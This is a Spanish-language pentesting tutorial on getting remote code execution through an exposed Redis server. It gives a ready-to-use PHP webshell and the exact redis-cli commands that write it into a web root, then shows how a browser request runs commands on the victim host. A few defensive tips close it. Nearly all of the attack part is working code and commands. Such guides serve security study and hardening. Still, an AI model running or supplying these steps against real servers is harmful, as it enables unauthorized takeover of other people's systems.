# RCE vía Redis (Webshell PHP)

## Introducción

Si un servidor tiene **Redis expuesto**, ya sea sin autenticación o con credenciales que conseguimos, podemos aprovecharlo para obtener **Remote Code Execution (RCE)** en la máquina. Redis nos permite escribir ficheros arbitrarios en disco, lo que lo hace un vector interesante explotación.

En este ejemplo vamos a generar una **PHP webshell**, subirla a un directorio accesible desde el navegador y ejecutar comandos.

---

## Preparación de la Webshell PHP

Creamos un fichero `cmd.php`. Es importante que tenga **2-3 saltos de línea al principio y al final**, ya que Redis a veces da fallos si no se hace así.

```php


<?php
    system($_REQUEST['cmd']);
?>


```

* Este PHP recibe un parámetro `cmd` y lo ejecuta directamente en el sistema.
* Guardamos este fichero localmente.

---

## Subir la webshell a Redis

1. Guardamos el contenido del fichero en una key de Redis usando `-x set`:

```bash
cat cmd.php | redis-cli -h 127.0.0.1 -x set reverse
```

2. Configuramos Redis para que escriba en un directorio accesible por el servidor web:

```bash
redis-cli -h 127.0.0.1 config set dir /var/www/html
```

3. Indicamos el nombre del fichero que queremos generar:

```bash
redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
```

4. Forzamos a Redis a guardar la base de datos en disco:

```bash
redis-cli -h 127.0.0.1 save
```

* Ahora, si accedemos a `http://victima/cmd.php?cmd=whoami` desde el navegador, ejecutaremos comandos en la máquina.

---

## Consideraciones de Seguridad

* Redis **no debería estar expuesto** públicamente.
* Nunca ejecutar Redis con permisos de root.
* El acceso a Redis sin autenticación es crítico y puede derivar en RCE completo.

